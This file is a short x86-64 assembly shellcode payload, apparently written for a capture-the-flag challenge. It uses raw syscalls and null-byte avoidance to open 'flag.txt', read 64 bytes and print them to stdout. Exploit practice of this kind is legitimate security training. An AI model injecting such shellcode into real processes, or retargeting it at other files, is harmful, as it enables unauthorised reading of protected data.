BITS 64

main:
    xor rbx, rbx
    push rbx			; need some null bytes
    mov rbx, 0x7478742e67616c66 ; 'flag.txt'
    push rbx
    mov rdi, rsp		; pointer to flag.txt
    xor rsi, rsi		; O_RDONLY
    mov al, 2			; sys_open
    syscall
    mov rdi, rax		; set the fd
    mov rsi, rsp		; just read to the stack
    mov edx, 64			; read 64 bytes
    xor rax, rax		; sys_read
    syscall
    mov rsi, rsp		; write the stack data
    mov rdx, rax		; length
    xor rdi, rdi
    inc edi			; write to stdout
    xor rax, rax
    inc eax			; sys_write
    syscall
